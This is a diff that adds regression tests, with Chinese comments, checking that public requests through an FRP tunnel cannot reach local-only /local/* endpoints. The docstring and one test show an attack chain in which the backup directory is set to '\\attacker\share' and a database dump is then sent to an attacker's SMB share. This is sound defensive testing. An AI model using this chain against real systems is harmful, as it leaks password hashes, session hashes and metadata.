@@ -89,6 +89,54 @@ class TestAccessControl:
         assert resp.status_code == 403
 
 
+class TestFrpTunnelIsNotLocal:
+    """P0（2026-11-04 审查）：FRP 隧道下，公网请求的 client_ip 也是 127.0.0.1。
+
+    物理链路：公网 → frps → frpc(本机) → Caddy → 127.0.0.1:8766。
+    Caddy 看到的 remote_host 就是本机回环，所以「只判 IP」等于把这组
+    免登录端点对整个公网开放。其中最狠的一条链路是：
+        POST /local/backup/dir {"dir":"\\attacker\share"} → POST /local/backup/run
+    两步合起来就是把整个数据库（口令哈希、会话哈希、全部元数据）
+    pg_dump 到攻击者的 SMB 共享。
+
+    可信信号是 Caddy 在隧道端口注入的 X-LanShare-Entry: public
+    （物理端口标记，客户端伪造不了），不是 IP。
+    """
+
+    def _client(self):
+        from app.api import local_backup
+
+        app = FastAPI()
+        app.include_router(router)
+        app.include_router(local_backup.router)
+        # 对端是回环 —— 这正是 frpc 本机转发到 Caddy 的形态
+        return TestClient(app, client=("127.0.0.1", 51234))
+
+    def test_public_marker_blocks_read(self):
+        resp = self._client().get(
+            "/local/public-url", headers={"X-LanShare-Entry": "public"}
+        )
+        assert resp.status_code == 403, (
+            "FRP 隧道下的公网请求拿到了 /local/public-url —— "
+            "整组 /local/* 对公网开放"
+        )
+
+    def test_public_marker_blocks_backup_dir_write(self):
+        """最危险的一条：把备份目录改成 UNC 共享。"""
+        resp = self._client().post(
+            "/local/backup/dir",
+            json={"dir": r"\\attacker\share"},
+            headers={"X-LanShare-Entry": "public"},
+        )
+        assert resp.status_code == 403
+
+    def test_public_marker_is_case_insensitive(self):
+        resp = self._client().get(
+            "/local/public-url", headers={"X-LanShare-Entry": "PUBLIC"}
+        )
+        assert resp.status_code == 403
+
+
 class TestRoundTrip:
     """用 monkeypatch 替掉 settings，验证读写逻辑本身。"""
 
